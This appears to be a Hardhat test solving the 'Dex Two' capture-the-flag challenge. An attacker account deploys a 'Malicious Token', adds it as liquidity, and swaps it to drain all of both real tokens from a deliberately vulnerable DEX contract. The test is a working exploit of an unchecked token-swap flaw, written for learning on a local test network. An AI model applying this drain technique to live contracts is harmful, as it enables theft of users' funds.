const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");

describe("Dex Two", function () {
  it("Should drain all of both tokens", async function () {
    const [_, eoa] = await ethers.getSigners()

    const Token1 = await ethers.getContractFactory("SwappableTokenTwo")
    const token1 = await Token1.deploy("Token 1", "T1", 110)

    const Token2 = await ethers.getContractFactory("SwappableTokenTwo")
    const token2 = await Token2.deploy("Token 2", "T2", 110)

    const Dex = await ethers.getContractFactory("DexTwo")
    const dex = await Dex.deploy(token1.address, token2.address)

    // Transfer 100 of each to dex
    await token1.transfer(dex.address, 100)
    await token2.transfer(dex.address, 100)


    // Transfer 10 of each to eoa
    await token1.transfer(eoa.address, 10)
    await token2.transfer(eoa.address, 10)

    // Deploy the malicious token
    const MalToken = await ethers.getContractFactory("SwappableTokenTwo")
    const malToken = await MalToken.connect(eoa).deploy("Malicious Token", "MAL", 100)

    await malToken.connect(eoa).approve(dex.address, 100)
    await dex.connect(eoa).add_liquidity(malToken.address, 1)

    // Since the dex has a liquidy of 100 token1 to 1 malToken
    // Swap price is `amount * 100 / 1`
    await dex.connect(eoa).swap(malToken.address, token1.address, 1)

    // Liquidity has not increases to 2
    // Swap price is `amount * 100 / 2`
    await dex.connect(eoa).swap(malToken.address, token2.address, 2)

    // Check that balance of token1 and token2 are 0
    expect(await token1.balanceOf(dex.address)).to.be.equal('0')
    expect(await token2.balanceOf(dex.address)).to.be.equal('0')


    
  });
});
